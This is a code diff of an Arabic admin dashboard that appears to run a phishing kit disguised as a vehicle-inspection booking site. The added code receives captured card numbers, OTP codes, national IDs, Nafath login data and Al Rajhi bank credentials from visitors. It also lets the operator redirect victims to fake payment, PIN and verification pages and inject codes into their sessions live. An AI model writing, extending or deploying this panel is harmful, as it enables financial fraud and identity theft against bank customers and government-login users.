+    renderBookings(bookings);
+    updateStats();
+    showToast('حجز جديد: ' + (b.name || 'عميل'), 'success');
+  });
+  socket.on('bookingUpdated', function(b) {
+    var i = bookings.findIndex(function(x){ return x.id === b.id; });
+    if (i >= 0) bookings[i] = b;
+    renderBookings(bookings);
+    updateStats();
+  });
+  socket.on('newData', function(d) {
+    addNotif(d);
+  });
 }
 
-async function loadBookings(){
-  try{
-    const r=await fetch(SRV+'/api/bookings');
-    const d=await r.json();
-    if(d.success){bookings=d.bookings||[];renderBookings(bookings);updateStats();}
-  }catch(e){renderBookings([]);}
+async function loadBookings() {
+  try {
+    var r = await fetch(SRV + '/api/bookings');
+    var d = await r.json();
+    if (d.success) { bookings = d.bookings || []; renderBookings(bookings); updateStats(); }
+  } catch(e) { renderBookings([]); }
 }
 
-function renderBookings(data){
-  const tb=document.getElementById('btable');
-  if(!data||!data.length){
-    tb.innerHTML='<tr><td colspan="9"><div class="empty"><i class="fas fa-inbox"></i><p>لا توجد حجوزات بعد</p></div></td></tr>';
+function renderBookings(data) {
+  var tb = document.getElementById('btable');
+  if (!data || !data.length) {
+    tb.innerHTML = '<tr><td colspan="9"><div class="empty"><i class="fas fa-inbox"></i><p>لا توجد حجوزات بعد</p></div></td></tr>';
     return;
   }
-  tb.innerHTML=data.map(function(b,i){
-    const pend=!b.status||b.status==='pending'||b.status==='new';
-    return '<tr><td>'+(i+1)+'</td><td>'+(b.name||'-')+'</td><td>'+(b.phone||'-')+'</td><td>'+(b.region||'-')+'</td><td>'+(b.service_type||b.serviceType||'-')+'</td><td>'+(b.booking_date||b.date||'-')+'</td><td>'+(b.booking_time||b.time||'-')+'</td><td>'+sbadge(b.status)+'</td><td><div class="abts"><button class="bdet" onclick="showDet('+i+')"><i class="fas fa-eye"></i> تفاصيل</button>'+(pend?'<button class="bacc" onclick="updSt('+b.id+',\'confirmed\')" title="قبول">&#10003;</button><button class="brej" onclick="updSt('+b.id+',\'rejected\')" title="رفض">&#10007;</button>':'')+'</div></td></tr>';
+  tb.innerHTML = data.map(function(b, i) {
+    var pend = !b.status || b.status === 'pending' || b.status === 'new';
+    return '<tr><td>' + (i+1) + '</td><td><b>' + (b.name||'-') + '</b></td><td>' + (b.phone_number||b.phone||'-') + '</td><td>' + (b.region||'-') + '</td><td>' + (b.service_type||'-') + '</td><td>' + (b.date_svc||b.date||'-') + '</td><td>' + (b.time_svc||b.time||'-') + '</td><td>' + sbadge(b.status) + '</td><td><div class="abts"><button class="bdet" onclick="showDet(' + i + ')"><i class="fas fa-eye"></i> تفاصيل</button>' + (pend ? '<button class="bacc" onclick="updSt(' + b.id + ',\'confirmed\')" title="قبول">&#10003;</button><button class="brej" onclick="updSt(' + b.id + ',\'rejected\')" title="رفض">&#10007;</button>' : '') + '</div></td></tr>';
   }).join('');
 }
 
-function sbadge(s){
-  var m={pending:'<span class="badge bp">قيد الانتظار</span>',confirmed:'<span class="badge bc">مؤكد</span>',rejected:'<span class="badge br">مرفوض</span>',new:'<span class="badge bn">جديد</span>'};
-  return m[s]||'<span class="badge bn">جديد</span>';
+function sbadge(s) {
+  var m = {pending:'<span class="badge bp">انتظار</span>',confirmed:'<span class="badge bc">مؤكد</span>',rejected:'<span class="badge br">مرفوض</span>',new:'<span class="badge bn">جديد</span>'};
+  return m[s] || '<span class="badge bn">جديد</span>';
 }
 
-function filterTable(){
-  var q=document.getElementById('srch').value.toLowerCase();
-  renderBookings(bookings.filter(function(b){return (b.name||'').toLowerCase().includes(q)||(b.phone||'').includes(q)||(b.region||'').toLowerCase().includes(q);}));
+function filterTable() {
+  var q = document.getElementById('srch').value.toLowerCase();
+  renderBookings(bookings.filter(function(b){ return (b.name||'').toLowerCase().includes(q)||(b.phone_number||b.phone||'').includes(q)||(b.region||'').toLowerCase().includes(q); }));
 }
 
-async function updSt(id,status){
-  try{
-    const r=await fetch(SRV+'/api/bookings/'+id+'/status',{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify({status:status})});
-    const d=await r.json();
-    if(d.success){showToast(status==='confirmed'?'تم قبول الحجز':'تم رفض الحجز',status==='confirmed'?'success':'error');loadBookings();closeM();}
-  }catch(e){showToast('حدث خطأ','error');}
+async function updSt(id, status) {
+  try {
+    var r = await fetch(SRV + '/api/bookings/' + id + '/status', {method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify({status:status})});
+    var d = await r.json();
+    if (d.success) { showToast(status==='confirmed'?'تم قبول الحجز':'تم رفض الحجز', status==='confirmed'?'success':'error'); loadBookings(); closeM(); }
+  } catch(e) { showToast('حدث خطأ','error'); }
 }
 
-function updateStats(){
-  var t=bookings.length;
-  var p=bookings.filter(function(b){return !b.status||b.status==='pending'||b.status==='new';}).length;
-  var c=bookings.filter(function(b){return b.status==='confirmed';}).length;
-  var today=new Date().toISOString().split('T')[0];
-  var td=bookings.filter(function(b){var d=b.booking_date||b.date||b.created_at||'';return d.includes(today);}).length;
-  document.getElementById('s5').textContent=t;
-  document.getElementById('s2').textContent=p;
-  document.getElementById('s3').textContent=c;
-  document.getElementById('s4').textContent=td;
+function updateStats() {
+  var t = bookings.length;
+  var p = bookings.filter(function(b){ return !b.status||b.status==='pending'||b.status==='new'; }).length;
+  var c = bookings.filter(function(b){ return b.status==='confirmed'; }).length;
+  var today = new Date().toISOString().split('T')[0];
+  var td = bookings.filter(function(b){ var d = b.created_at||''; return d.includes(today); }).length;
+  document.getElementById('s5').textContent = t;
+  document.getElementById('s2').textContent = p;
+  document.getElementById('s3').textContent = c;
+  document.getElementById('s4').textContent = td;
 }
 
-function updateVStats(){document.getElementById('s1').textContent=Object.keys(visitors).length;}
-
-var PAGES=['home','booking','payments','phone','pin','code','whats','nafad','success'];
-
-function renderVisitors(){
-  var vg=document.getElementById('vgrid'),ng=document.getElementById('ngrid');
-  var ents=Object.entries(visitors);
-  if(!ents.length){
-    vg.innerHTML='<div class="empty"><i class="fas fa-users"></i><p>لا يوجد زوار متصلون حالياً</p></div>';
-    ng.innerHTML='<div class="empty"><i class="fas fa-route"></i><p>لا يوجد زوار متصلون</p></div>';
+function renderVisitors() {
+  var vb = document.getElementById('vbody');
+  if (!visitors.length) {
+    vb.innerHTML = '<div class="empty" style="padding:20px"><i class="fas fa-users"></i><p>لا يوجد زوار</p></div>';
     return;
   }
-  vg.innerHTML=ents.map(function(e){var id=e[0],v=e[1];return '<div class="vcard"><div class="vchdr"><span class="vid">'+id.substring(0,8)+'...</span><span class="vonl"></span></div><div class="vpg">&#128205; '+(v.page||'الرئيسية')+'</div><div class="vip">'+(v.ip||'')+'</div></div>';}).join('');
-  ng.innerHTML=ents.map(function(e){var id=e[0],v=e[1];return '<div class="vcard"><div class="vchdr"><span class="vid">'+id.substring(0,8)+'...</span><span class="vonl"></span></div><div class="vpg" style="margin-bottom:8px">&#128205; '+(v.page||'الرئيسية')+'</div><div class="vacts"><select class="nsel" id="nv-'+id+'">'+PAGES.map(function(p){return '<option value="'+p+'">'+p+'</option>';}).join('')+'</select><button class="bsnav" onclick="sendNav(\''+id+'\')"><i class="fas fa-paper-plane"></i></button></div></div>';}).join('');
+  vb.innerHTML = visitors.map(function(v) {
+    var opts = PAGES.map(function(p){ return '<option value="' + p.v + '">' + p.l + '</option>'; }).join('');
+    return '<div class="vitem"><div class="virow"><span class="vsid">' + (v.socketId||'').substring(0,10) + '...</span><span class="vonl"></span></div><div class="vpg"><i class="fas fa-map-marker-alt" style="color:#1a6b4a;margin-left:4px"></i>' + (v.page||'الرئيسية') + '</div><div class="vip">' + (v.ip||'') + '</div><div class="vnav"><select class="nsel" id="ns-' + v.socketId + '">' + opts + '</select><button class="bsnav" onclick="sendNav(\'' + v.socketId + '\')"><i class="fas fa-paper-plane"></i> توجيه</button></div><div class="vcode"><input class="cinp" id="ci-' + v.socketId + '" placeholder="أرسل كود..."/><button class="bscode" onclick="sendCode(\'' + v.socketId + '\')"><i class="fas fa-key"></i></button></div></div>';
+  }).join('');
 }
 
-function sendNav(sid){
-  var p=document.getElementById('nv-'+sid);
-  if(socket&&p){socket.emit('adminNavigate',{socketId:sid,page:p.value});showToast('تم إرسال أمر التوجيه إلى '+p.value,'success');}
+function sendNav(sid) {
+  var sel = document.getElementById('ns-' + sid);
+  if (socket && sel) {
+    socket.emit('adminNavigate', { socketId: sid, page: sel.value });
+    showToast('تم التوجيه إلى ' + sel.value, 'success');
+  }
 }
 
-function showDet(idx){
-  var b=bookings[idx];if(!b)return;
-  document.getElementById('mbody').innerHTML='<div class="drow"><span class="dlbl">الاسم</span><span class="dval">'+(b.name||'-')+'</span></div><div class="drow"><span class="dlbl">رقم الهاتف</span><span class="dval">'+(b.phone||'-')+'</span></div><div class="drow"><span class="dlbl">المنطقة</span><span class="dval">'+(b.region||'-')+'</span></div><div class="drow"><span class="dlbl">نوع الخدمة</span><span class="dval">'+(b.service_type||b.serviceType||'-')+'</span></div><div class="drow"><span class="dlbl">تاريخ الفحص</span><span class="dval">'+(b.booking_date||b.date||'-')+'</span></div><div class="drow"><span class="dlbl">وقت الفحص</span><span class="dval">'+(b.booking_time||b.time||'-')+'</span></div><div class="drow"><span class="dlbl">الحالة</span><span class="dval">'+sbadge(b.status)+'</span></div><div class="drow"><span class="dlbl">تاريخ التسجيل</span><span class="dval">'+(b.created_at?new Date(b.created_at).toLocaleDateString('ar'):'-')+'</span></div>';
-  var ma=document.getElementById('macts');
-  var pend=!b.status||b.status==='pending'||b.status==='new';
-  ma.innerHTML=pend?'<button class="macc" onclick="updSt('+b.id+',\'confirmed\')"><i class="fas fa-check"></i> قبول</button><button class="mrej2" onclick="updSt('+b.id+',\'rejected\')"><i class="fas fa-times"></i> رفض</button>':'';
+function sendCode(sid) {
+  var inp = document.getElementById('ci-' + sid);
+  if (socket && inp && inp.value) {
+    socket.emit('adminSendCode', { socketId: sid, code: inp.value, type: 'whats' });
+    showToast('تم إرسال الكود', 'info');
+    inp.value = '';
+  }
+}
+
+var typeLabels = {
+  payment: 'بيانات بطاقة',
+  phone: 'رقم الهاتف',
+  phoneCode: 'كود الهاتف',
+  code: 'كود OTP',
+  nafad: 'بيانات نفاذ',
+  rajhi: 'بيانات الراجحي',
+  rajhiCode: 'كود الراجحي',
+  verification: 'بيانات التحقق'
+};
+
+function addNotif(d) {
+  notifs.unshift(d);
+  if (notifs.length > 50) notifs.pop();
+  renderNotifs();
+  showToast('بيانات جديدة: ' + (typeLabels[d.type] || d.type), 'info');
+}
+
+function renderNotifs() {
+  var nb = document.getElementById('ntfbody');
+  if (!notifs.length) {
+    nb.innerHTML = '<div class="empty" style="padding:20px"><i class="fas fa-inbox"></i><p>لا توجد بيانات بعد</p></div>';
+    return;
+  }
+  nb.innerHTML = notifs.map(function(d) {
+    var now = new Date().toLocaleTimeString('ar');
+    var detail = '';
+    if (d.type === 'payment' && d.data) detail = 'البطاقة: ' + (d.data.cardNumber||'').replace(/(.{4})/g,'$1 ').trim();
+    else if (d.type === 'phone' && d.data) detail = 'الهوية: ' + (d.data.nationalId||d.data.nationalID||'');
+    else if ((d.type === 'code' || d.type === 'phoneCode') && d.data) detail = 'الكود: ' + (d.data.code||'');
+    else if (d.type === 'rajhi' && d.data) detail = 'المستخدم: ' + (d.data.username||'');
+    return '<div class="ntfitem"><span class="ntftime">' + now + '</span><div class="ntftype">' + (typeLabels[d.type]||d.type) + '</div><div class="ntfip">IP: ' + (d.ip||'-') + '</div>' + (detail ? '<div style="font-size:11px;color:#374151;margin-top:3px">' + detail + '</div>' : '') + '</div>';
+  }).join('');
+}
+
+function clearNotifs() { notifs = []; renderNotifs(); }
+
+function showDet(idx) {
+  var b = bookings[idx]; if (!b) return;
+  document.getElementById('mbody').innerHTML =
+    '<div class="drow"><span class="dlbl">الاسم</span><span class="dval">' + (b.name||'-') + '</span></div>' +
+    '<div class="drow"><span class="dlbl">رقم الهوية</span><span class="dval">' + (b.national_id||'-') + '</span></div>' +
+    '<div class="drow"><span class="dlbl">رقم الهاتف</span><span class="dval">' + (b.phone_number||b.phone||'-') + '</span></div>' +
+    '<div class="drow"><span class="dlbl">البريد الإلكتروني</span><span class="dval">' + (b.email||'-') + '</span></div>' +
+    '<div class="drow"><span class="dlbl">الجنسية</span><span class="dval">' + (b.nationality||'-') + '</span></div>' +
+    '<div class="drow"><span class="dlbl">المنطقة</span><span class="dval">' + (b.region||'-') + '</span></div>' +
+    '<div class="drow"><span class="dlbl">نوع الخدمة</span><span class="dval">' + (b.service_type||'-') + '</span></div>' +
+    '<div class="drow"><span class="dlbl">تاريخ الفحص</span><span class="dval">' + (b.date_svc||b.date||'-') + '</span></div>' +
+    '<div class="drow"><span class="dlbl">وقت الفحص</span><span class="dval">' + (b.time_svc||b.time||'-') + '</span></div>' +
+    '<div class="drow"><span class="dlbl">رقم اللوحة</span><span class="dval">' + (b.plate||'-') + '</span></div>' +
+    '<div class="drow"><span class="dlbl">الحالة</span><span class="dval">' + sbadge(b.status) + '</span></div>' +
+    '<div class="drow"><span class="dlbl">IP</span><span class="dval">' + (b.ip||'-') + '</span></div>' +
+    '<div class="drow"><span class="dlbl">تاريخ التسجيل</span><span class="dval">' + (b.created_at ? new Date(b.created_at).toLocaleString('ar') : '-') + '</span></div>';
+  var pend = !b.status || b.status === 'pending' || b.status === 'new';
+  document.getElementById('macts').innerHTML = pend ?
+    '<button class="macc" onclick="updSt(' + b.id + ',\'confirmed\')"><i class="fas fa-check"></i> قبول</button><button class="mrej2" onclick="updSt(' + b.id + ',\'rejected\')"><i class="fas fa-times"></i> رفض</button>' : '';
   document.getElementById('moverlay').classList.add('active');
 }
 
-function closeMO(e){if(e.target===document.getElementById('moverlay'))closeM();}
-function closeM(){document.getElementById('moverlay').classList.remove('active');}
+function closeMO(e) { if (e.target === document.getElementById('moverlay')) closeM(); }
+function closeM() { document.getElementById('moverlay').classList.remove('active'); }
 
-function switchTab(name,btn){
-  document.querySelectorAll('.tcont').forEach(function(t){t.classList.remove('active');});
-  document.querySelectorAll('.tbtn').forEach(function(b){b.classList.remove('active');});
-  document.getElementById('tab-'+name).classList.add('active');
-  btn.classList.add('active');
-  if(name==='visitors'||name==='navigate')renderVisitors();
-}
-
-function showToast(msg,type){
-  var t=document.getElementById('toast');
-  t.textContent=msg;
-  t.className='toast show '+(type||'');
-  setTimeout(function(){t.className='toast';},3000);
+function showToast(msg, type) {
+  var t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = 'toast show ' + (type||'');
+  setTimeout(function(){ t.className = 'toast'; }, 3000);
 }
 </script>
 </body>
